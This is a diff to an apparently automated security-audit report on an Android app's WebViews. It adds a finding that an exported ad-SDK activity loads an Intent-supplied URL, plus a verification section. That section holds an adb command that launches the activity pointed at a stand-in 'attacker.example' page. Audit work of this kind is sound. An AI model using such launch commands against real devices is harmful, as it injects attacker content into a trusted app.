@@ -8,7 +8,7 @@
 ## Summary
 
 - CRITICAL: 5
-- HIGH: 31
+- HIGH: 32
 - MEDIUM: 56
 - LOW: 20
 - INFO: 6
@@ -380,6 +380,15 @@ Any WebView in the process is attachable via chrome://inspect. On a production b
 
 ```
 WebView.setWebContentsDebuggingEnabled(true)
+```
+
+### [HIGH] CORR-023 - org.prebid.mobile.rendering.views.browser.AdBrowserActivity: exported entry point loads an Intent-supplied URL into a WebView
+_org.prebid.mobile.rendering.views.browser.AdBrowserActivity_
+
+This exported activity derives the URL it displays from the Intent that started it (extra, data, or an extra's URL field) and passes it straight to WebView.loadUrl. Any app on the device can start it with an explicit intent and an arbitrary URL — no intent-filter is required, and no in-app user action is involved — so attacker-controlled web content renders inside the app's own WebView.
+
+```
+exported=true; intent extras -> getString(EXTRA_URL) -> loadUrl
 ```
 
 ### [MEDIUM] WV-SET-001 - JavaScript enabled in WebView (True)
@@ -1258,6 +1267,20 @@ addJavascriptInterface exposes a native object to page script. A bridge reachabl
 addJavascriptInterface(interstitialJSInterface, "jsBridge")
 ```
 
+## Reachability
+
+These exported entry points render a URL chosen by whoever launches them, so any app on the device (or an ad SDK, or a browsed link) can drive them with no user action inside the app. Verify on a test device with `adb`, substituting the component and extra key:
+
+```sh
+# org.prebid.mobile.rendering.views.browser.AdBrowserActivity
+adb shell am start -n com.duolingo/org.prebid.mobile.rendering.views.browser.AdBrowserActivity -e EXTRA_URL "https://attacker.example/poc.html"
+
+```
+
+| component | intent-URL flow | JS bridge | local file access |
+|-----------|-----------------|-----------|-------------------|
+| `org.prebid.mobile.rendering.views.browser.AdBrowserActivity` | intent extras -> getString(EXTRA_URL) -> loadUrl | — | — |
+
 ## WebView hosts
 
 ### `com.unity3d.services.core.webview.WebView`
@@ -1513,6 +1536,7 @@ addJavascriptInterface(interstitialJSInterface, "jsBridge")
 - settings:
   - `javascript_enabled` = `True`
   - `js_can_open_windows_automatically` = `False`
+- intent-supplied URL: `intent extras -> getString(EXTRA_URL) -> loadUrl`
 
 ### `org.prebid.mobile.rendering.views.webview.AdWebView`
 - sources: smali
@@ -1670,6 +1694,7 @@ addJavascriptInterface(interstitialJSInterface, "jsBridge")
 - sources: smali
 - settings:
   - `javascript_enabled` = `True`
+- intent-supplied URL: `intent extras -> getString(external_url) -> loadUrl`
 
 ### `defpackage.x8b0`
 - sources: java
@@ -1733,7 +1758,7 @@ addJavascriptInterface(interstitialJSInterface, "jsBridge")
 
 | kind | name | exported | deeplinks |
 |------|------|----------|-----------|
-| activity | `com.duolingo.splash.LaunchActivity` | True | duolingo://max<br>duolingo://avatar_suits_update<br>duolingo://practice<br>duolingo://profile |
+| activity | `com.duolingo.splash.LaunchActivity` | True | duolingo://chess-puzzle<br>duolingo://chess-launch<br>duolingo://o<br>duolingo://daily-chess-puzzle |
 | activity | `zendesk.support.guide.HelpCenterActivity` | False |  |
 | activity | `zendesk.support.guide.ViewArticleActivity` | False |  |
 | activity | `zendesk.support.request.RequestActivity` | False |  |
